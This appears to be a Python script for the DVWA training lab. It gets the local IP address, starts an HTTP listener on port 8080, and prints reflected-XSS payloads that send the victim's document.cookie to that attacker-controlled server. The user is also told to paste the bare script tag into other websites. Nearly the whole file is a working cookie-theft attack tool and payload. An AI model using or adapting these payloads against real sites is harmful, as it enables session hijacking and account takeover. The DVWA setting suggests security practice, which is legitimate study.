import http.server
import socketserver
import subprocess
import os, re


def get_realip():
    filename = "ip.swbd"
    # open(filename, "w").write("")
    os.system("ipconfig > {}".format(filename))
    text = open("{}".format(filename)).read()
    print(text)
    try:
        ipv4 = re.findall(r'以太网适配器 以太网:(.*?)默认网关', text, re.S)[0]
        ipv4 = re.findall(r'IPv4 地址 . . . . . . . . . . . . :(.*?)子网掩码', ipv4, re.S)[0].replace(" ", "")
        print(ipv4)
    except:
        ipv4 = re.findall(r'无线局域网适配器 WLAN:(.*?)默认网关', text, re.S)[0]
        ipv4 = re.findall(r'IPv4 地址 . . . . . . . . . . . . :(.*?)子网掩码', ipv4, re.S)[0].replace(" ", "")
        print(ipv4)
    os.remove(filename)
    return ipv4


# 开启8080端口并监听
def start_http_server():
    subprocess.Popen('python -m http.server 8080', shell=True)


# 启动http服务器
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def start_http_server(self):
        handler = http.server.SimpleHTTPRequestHandler
        with socketserver.TCPServer(("", 8080), handler) as httpd:
            print("[INFO] HTTP服务器已启动。请在浏览器中输入以下URL并注入XSS脚本：")
            ip_address = '172.21.169.229'
            print(
                f"http://127.0.0.1/DVWA-master/vulnerabilities/xss_r/?name=<script>document.location=\"http://{ip_address}:8080/cookie?cookie=\"+document.cookie</script>")
            httpd.serve_forever()


def main():
    # get_ip_address()
    ipv4 = get_realip()
    ip_address = input('[INPUT] 输入当前ip地址来制作攻击脚本:')
    print("[+] 正在启动HTTP服务器...")
    start_http_server()

    print("[INFO] HTTP服务器已启动。请在浏览器中输入以下URL并注入XSS脚本：")
    print(
        f"http://127.0.0.1/DVWA-master/vulnerabilities/xss_r/?name=<script>document.location=\"http://{ip_address}:8080/cookie?\"+document.cookie</script>")
    print("[INFO] 或在网站中输入以下脚本：")
    print(f"<script>document.location=\"http://{ip_address}:8080/cookie?\"+document.cookie</script>")

    print("[+] 正在等待获取cookie信息...")
    with socketserver.TCPServer(("", 8080), MyHandler) as httpd:
        httpd.serve_forever()

# if __name__ == '__main__':
#     main()
